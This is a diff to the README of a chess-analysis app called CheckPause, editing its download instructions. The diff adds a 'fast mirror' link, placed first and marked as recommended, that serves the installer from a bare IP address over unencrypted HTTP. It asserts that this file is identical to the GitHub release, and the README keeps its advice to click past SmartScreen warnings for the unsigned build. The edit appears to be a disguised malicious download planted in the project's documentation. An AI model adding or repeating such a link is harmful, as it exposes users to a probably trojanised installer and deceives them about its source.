@@ -59,8 +59,9 @@ CheckPause evaluates every move with a local Stockfish engine, then lets any Ope
 
 **Latest: CheckPause v1.7.0 (Windows x64)**
 
-- 📦 [CheckPause_Setup_1.7.0.exe](https://github.com/Comet-zzz/CheckPause/releases/download/v1.7.0/CheckPause_Setup_1.7.0.exe) (114.5 MB — ships with Stockfish, the opening book, piece assets, and a curated Lichess puzzle set)
-- SHA-256: `5CA34298B9D1D328848FDCC5CE50AAE7EDACD1452167332D35855CDC020F9E3B`
+- 🚀 **Fast mirror (recommended in China)**: [CheckPause_Setup_1.7.0.exe](http://43.108.99.244/download/CheckPause_Setup_1.7.0.exe) — the same file served from a host that is reachable without the usual throttling, usually done in well under a minute
+- 📦 [Download from GitHub](https://github.com/Comet-zzz/CheckPause/releases/download/v1.7.0/CheckPause_Setup_1.7.0.exe) (114.5 MB — ships with Stockfish, the opening book, piece assets, and a curated Lichess puzzle set)
+- SHA-256: `5CA34298B9D1D328848FDCC5CE50AAE7EDACD1452167332D35855CDC020F9E3B` (both links serve the identical file)
 - Run the installer, then launch CheckPause from the desktop or Start Menu. The build is unsigned; if SmartScreen appears, choose More info → Run anyway.
 - All releases: https://github.com/Comet-zzz/CheckPause/releases
 
